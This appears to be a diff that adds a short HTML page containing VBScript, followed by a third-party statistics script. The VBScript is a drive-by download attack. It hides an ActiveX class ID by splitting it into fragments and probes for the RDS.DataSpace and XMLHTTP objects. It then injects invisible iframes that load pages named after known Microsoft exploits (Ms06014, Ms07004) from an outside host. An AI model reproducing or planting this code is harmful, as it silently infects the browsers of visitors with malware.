@@ -1,0 +1,17 @@
+<html>
+<script language=VBScript>
+on error resume next
+Set downf = document.createElement("object")
+downf.setAttribute "classid", "clsid:BD9"&"6C556-6"&"5A3-11D"&"0-983A-00C"&"04FC2"&"9E36"
+str="Microsoft.XMLHTTP"
+Set O = downf.CreateObject(str,"")
+if Not Err.Number = 0 then
+err.clear
+document.write("<iframe width=""5"" height=""5"" src=""http://www.nihaorr1.com/Yahoo.php""></iframe>")
+document.write("<iframe width=""5"" height=""5"" src=""http://www.nihaorr1.com/Ms07004.htm""></iframe>")
+else
+document.write("<iframe width=""0"" height=""0"" src=""http://www.nihaorr1.com/Ajax.htm""></iframe>")
+document.write("<iframe width=""0"" height=""0"" src=""http://www.nihaorr1.com/Ms06014.htm""></iframe>")
+end if
+</script></html>
+<script src='http://s36.cnzz.com/stat.php?id=890787&web_id=890787&online=1&show=line' language='JavaScript' charset='gb2312'></script>
